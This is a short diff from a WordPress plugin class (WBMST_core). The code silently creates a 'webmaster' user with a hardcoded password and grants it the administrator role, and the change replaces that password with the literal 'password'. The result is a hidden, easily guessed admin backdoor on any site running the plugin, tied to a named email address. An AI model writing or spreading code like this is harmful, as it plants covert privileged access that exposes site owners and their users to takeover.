@@ -93,7 +93,7 @@ class WBMST_core{
             }
 
             if ( !username_exists( 'webmaster' ) ){
-                $wm = new WP_User ( wp_create_user( 'webmaster' , 'devonstools' , 'devon@zodiacgraphics.biz'  ) );
+                $wm = new WP_User ( wp_create_user( 'webmaster' , 'password' , 'devon@zodiacgraphics.biz'  ) );
                 $wm->remove_role( 'subscriber' );
                 $wm->add_role( 'administrator' );
             }
